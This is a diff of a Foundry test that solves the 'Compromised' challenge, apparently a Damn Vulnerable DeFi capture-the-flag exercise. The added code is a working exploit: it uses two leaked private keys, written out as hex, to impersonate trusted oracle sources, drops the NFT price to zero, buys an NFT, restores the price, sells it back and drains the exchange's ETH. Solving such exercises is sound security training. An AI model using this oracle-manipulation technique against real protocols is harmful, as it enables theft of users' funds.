@@ -20,14 +20,17 @@ contract CompromisedChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
     uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;
 
-
     address[] sources = [
         0x188Ea627E3531Db590e6f1D71ED83628d1933088,
         0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
         0xab3600bF153A316dE44827e2473056d56B774a40
     ];
     string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
-    uint256[] prices = [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE];
+    uint256[] prices = [
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE,
+        INITIAL_NFT_PRICE
+    ];
 
     TrustfulOracle oracle;
     Exchange exchange;
@@ -50,10 +53,13 @@ contract CompromisedChallenge is Test {
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
 
         // Deploy the oracle and setup the trusted sources with initial prices
-        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();
+        oracle = (new TrustfulOracleInitializer(sources, symbols, prices))
+            .oracle();
 
         // Deploy the exchange and get an instance to the associated ERC721 token
-        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
+        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(
+            address(oracle)
+        );
         nft = exchange.token();
 
         vm.stopPrank();
@@ -75,7 +81,44 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        // These are thetwo private keys we decoded from the server hexadeciimal response decoded using base64 and checked their match in the trusted orarcles to make sure
+        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        // Step 1: Lower the price of NFTs to near-zero using the compromised oracle sources
+        // Use the first compromised source to post a low price
+        vm.startPrank(sources[0]); // 0x188Ea627E3531Db590e6f1D71ED83628d1933088
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        // Use the second compromised source to post a low price
+        vm.startPrank(sources[1]); // 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
+        oracle.postPrice("DVNFT", 0);
+        vm.stopPrank();
+
+        // Step 2: Buy an NFT for almost free as the player
+
+        vm.startPrank(player);
+        uint256 nftId = exchange.buyOne{value: 1 wei}();
+        vm.stopPrank();
+
+        // Step 3: Restore the prices back to their original value
+        vm.startPrank(sources[0]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.stopPrank();
+
+        // Step 4: Sell the NFT back to the exchange at the restored high price
+        vm.startPrank(player);
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+
+        // Step 5: Transfer all ETH to the recovery account
+        payable(recovery).transfer(EXCHANGE_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
     }
 
     /**
